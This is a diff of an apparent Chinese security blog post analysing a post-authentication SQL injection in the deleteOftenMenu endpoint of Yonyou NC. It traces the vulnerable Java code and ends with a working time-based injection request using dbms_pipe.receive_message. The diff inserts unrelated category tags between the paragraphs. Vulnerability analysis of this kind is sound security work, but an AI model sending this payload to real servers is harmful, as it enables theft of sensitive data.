@@ -8,7 +8,7 @@ asset_dir: embedded-base64
 
 [用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B "用友")NC系统可利用deleteOftenMenu传入的参数实现[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5 "标签：SQL注入")，从而窃取服务器的敏感信息。
 
-云存储
+企业技术
 
 # 影响版本
 
@@ -26,7 +26,7 @@ NC63、NC633、NC65
 
 因此搜索 deleteOftenMenu 方法的实现部分即可定位业务逻辑实现代码
 
-脚本语言
+黑客与破解
 
 ```
 package nc.uap.portal.action;
@@ -80,6 +80,14 @@ public class DeleteOftenMenuAction extends BaseAction {
 }
 ```
 
+深入探索
+
+数据
+
+Java（编程语言）
+
+数据管理
+
 pk 直接拼接进SQL语句后，带入 queryVOs 函数，其实现逻辑如下
 
 编程
@@ -126,7 +134,7 @@ public <T extends SuperVO> T[] queryVOs(String sql, Class<T> clazz, PaginationIn
 
 经过 getSelectSQL 处理带入 queryVOByPinfo，getSelectSQL 实现如下
 
-黑客与破解
+战略规划
 
 ```
 public static String getSelectSQL(String tableName, String[] fields) {
@@ -150,7 +158,7 @@ public static String getSelectSQL(String tableName, String[] fields) {
 
 queryVOByPinfo 实现如下
 
-管理
+编程
 
 ```
 private <T extends SuperVO> T[] queryVOByPinfo(JdbcSession ses, String sql, String orderByPart, SQLParameter param, PaginationInfo pg, Class voclass, PersistenceManager pm, ResultSetProcessor rp) throws DbException {
@@ -209,7 +217,7 @@ private <T extends SuperVO> T[] queryVOByPinfo(JdbcSession ses, String sql, Stri
 
 同样因为存在 `LfwRuntimeEnvironment.getLfwSessionBean()` ，[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")利用需要登录权限
 
-网络
+战略规划
 
 ```
 GET /portal/pt/deleteMenu/deleteOftenMenu?pageId=login&pk=1'AND+1=dbms_pipe.receive_message('RDS', 6)-- HTTP/1.0
